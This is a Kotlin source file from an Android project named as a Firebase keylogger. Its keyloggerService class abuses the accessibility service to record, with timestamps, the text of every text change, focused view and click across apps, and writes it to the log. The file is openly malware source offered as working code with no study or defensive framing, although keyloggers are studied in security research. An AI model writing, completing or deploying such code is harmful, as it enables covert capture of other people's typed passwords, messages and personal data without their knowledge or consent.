package com.sm.sdt.firebasekeyloggerandroird

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.util.Log.i
import android.view.accessibility.AccessibilityEvent
import com.sm.sdt.firebasekeyloggerandroird.ConstFun.getDateTime

class keyloggerService : AccessibilityService() {

    val TAG = "AccessibilityServiceTAG"


    override fun onServiceConnected() {
        i(TAG, "onServiceConnected: Keylogger Activated")
    }


    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        when (event!!.eventType){
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(TEXT)| $data")
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(FOCUSED)| $data")
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(CLICKED)| $data")
            }
        }
    }

    override fun onInterrupt() {
        Log.i(TAG, "onInterrupt: Keylogger Disconnected")
    }

}